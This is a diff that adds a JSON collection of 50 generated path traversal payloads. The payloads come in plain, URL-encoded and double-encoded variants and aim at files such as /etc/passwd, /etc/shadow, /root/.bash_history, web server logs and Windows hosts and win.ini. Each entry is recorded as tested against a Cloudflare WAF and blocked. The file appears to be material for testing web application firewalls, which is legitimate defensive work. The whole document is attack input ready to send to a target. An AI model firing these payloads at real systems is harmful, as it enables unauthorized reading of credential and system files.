@@ -1,0 +1,707 @@
+{
+  "category": "path_traversal",
+  "subcategory": "comprehensive",
+  "count": 50,
+  "payloads": [
+    {
+      "id": "path_traversal-6000",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//etc/passwd",
+      "description": "Path traversal depth 1 /etc/passwd plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6001",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2fetc%2fpasswd",
+      "description": "Path traversal depth 1 /etc/passwd %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6002",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2fetc%2fpasswd",
+      "description": "Path traversal depth 1 /etc/passwd %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6003",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2fetc%2fpasswd",
+      "description": "Path traversal depth 1 /etc/passwd ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6004",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2fetc%2fpasswd",
+      "description": "Path traversal depth 1 /etc/passwd ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6005",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//etc/shadow",
+      "description": "Path traversal depth 1 /etc/shadow plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6006",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2fetc%2fshadow",
+      "description": "Path traversal depth 1 /etc/shadow %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6007",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2fetc%2fshadow",
+      "description": "Path traversal depth 1 /etc/shadow %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6008",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2fetc%2fshadow",
+      "description": "Path traversal depth 1 /etc/shadow ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6009",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2fetc%2fshadow",
+      "description": "Path traversal depth 1 /etc/shadow ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6010",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//etc/hosts",
+      "description": "Path traversal depth 1 /etc/hosts plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6011",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2fetc%2fhosts",
+      "description": "Path traversal depth 1 /etc/hosts %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6012",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2fetc%2fhosts",
+      "description": "Path traversal depth 1 /etc/hosts %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6013",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2fetc%2fhosts",
+      "description": "Path traversal depth 1 /etc/hosts ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6014",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2fetc%2fhosts",
+      "description": "Path traversal depth 1 /etc/hosts ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6015",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//etc/group",
+      "description": "Path traversal depth 1 /etc/group plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6016",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2fetc%2fgroup",
+      "description": "Path traversal depth 1 /etc/group %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6017",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2fetc%2fgroup",
+      "description": "Path traversal depth 1 /etc/group %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6018",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2fetc%2fgroup",
+      "description": "Path traversal depth 1 /etc/group ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6019",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2fetc%2fgroup",
+      "description": "Path traversal depth 1 /etc/group ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6020",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//proc/version",
+      "description": "Path traversal depth 1 /proc/version plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6021",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2fproc%2fversion",
+      "description": "Path traversal depth 1 /proc/version %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6022",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2fproc%2fversion",
+      "description": "Path traversal depth 1 /proc/version %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6023",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2fproc%2fversion",
+      "description": "Path traversal depth 1 /proc/version ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6024",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2fproc%2fversion",
+      "description": "Path traversal depth 1 /proc/version ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6025",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//var/log/apache2/access.log",
+      "description": "Path traversal depth 1 /var/log/apache2/access.log plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6026",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2fvar%2flog%2fapache2%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/apache2/access.log %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6027",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2fvar%2flog%2fapache2%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/apache2/access.log %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6028",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2fvar%2flog%2fapache2%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/apache2/access.log ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6029",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2fvar%2flog%2fapache2%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/apache2/access.log ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6030",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//var/log/nginx/access.log",
+      "description": "Path traversal depth 1 /var/log/nginx/access.log plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6031",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2fvar%2flog%2fnginx%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/nginx/access.log %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6032",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2fvar%2flog%2fnginx%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/nginx/access.log %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6033",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2fvar%2flog%2fnginx%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/nginx/access.log ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6034",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2fvar%2flog%2fnginx%2faccess.log",
+      "description": "Path traversal depth 1 /var/log/nginx/access.log ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6035",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..//root/.bash_history",
+      "description": "Path traversal depth 1 /root/.bash_history plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6036",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2f%2froot%2f.bash_history",
+      "description": "Path traversal depth 1 /root/.bash_history %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6037",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252f%2froot%2f.bash_history",
+      "description": "Path traversal depth 1 /root/.bash_history %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6038",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2f%2froot%2f.bash_history",
+      "description": "Path traversal depth 1 /root/.bash_history ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6039",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252f%2froot%2f.bash_history",
+      "description": "Path traversal depth 1 /root/.bash_history ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6040",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "../C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "description": "Path traversal depth 1 C:\\Windows\\System32\\drivers\\etc\\hosts plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6041",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2fC:\\Windows\\System32\\drivers\\etc\\hosts",
+      "description": "Path traversal depth 1 C:\\Windows\\System32\\drivers\\etc\\hosts %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6042",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252fC:\\Windows\\System32\\drivers\\etc\\hosts",
+      "description": "Path traversal depth 1 C:\\Windows\\System32\\drivers\\etc\\hosts %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6043",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2fC:\\Windows\\System32\\drivers\\etc\\hosts",
+      "description": "Path traversal depth 1 C:\\Windows\\System32\\drivers\\etc\\hosts ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6044",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252fC:\\Windows\\System32\\drivers\\etc\\hosts",
+      "description": "Path traversal depth 1 C:\\Windows\\System32\\drivers\\etc\\hosts ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6045",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "../C:\\Windows\\win.ini",
+      "description": "Path traversal depth 1 C:\\Windows\\win.ini plain",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6046",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%2e%2e%2fC:\\Windows\\win.ini",
+      "description": "Path traversal depth 1 C:\\Windows\\win.ini %2e%2e%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6047",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "%252e%252e%252fC:\\Windows\\win.ini",
+      "description": "Path traversal depth 1 C:\\Windows\\win.ini %252e%252e%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6048",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%2fC:\\Windows\\win.ini",
+      "description": "Path traversal depth 1 C:\\Windows\\win.ini ..%2f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-6049",
+      "category": "path_traversal",
+      "subcategory": "comprehensive",
+      "payload": "..%252fC:\\Windows\\win.ini",
+      "description": "Path traversal depth 1 C:\\Windows\\win.ini ..%252f",
+      "technique": "path_traversal",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
